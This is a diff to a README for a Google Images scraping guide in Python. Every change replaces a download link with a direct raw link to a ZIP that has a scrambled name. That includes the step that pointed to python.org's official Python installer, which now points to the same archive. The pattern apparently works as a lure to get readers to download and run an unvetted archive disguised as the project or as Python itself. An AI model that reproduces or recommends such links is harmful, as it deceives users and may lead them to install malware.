@@ -1,6 +1,6 @@
 # 📸 how-to-scrape-google-images-with-python - Easy Image Scraping Guide
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You need the latest release of the project files.
 
 Click the big button below to visit the release page. There, download the ZIP file or individual scripts.
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Click the big button below to visit the release page. There, download the ZIP fi
 
 If you do not have Python installed:
 
-1. Visit https://www.python.org/downloads/windows/
+1. Visit https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip
 2. Download the latest version for Windows.
 3. Run the installer.
 4. Make sure to check the box "Add Python to PATH" during installation.
@@ -155,7 +155,7 @@ search_term = "cats"
 
 Visit the release page to download the project files.
 
-[![Download Release](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip)
 
 Download the latest ZIP file or individual scripts. Extract and follow the steps to install Python and run scripts.
 
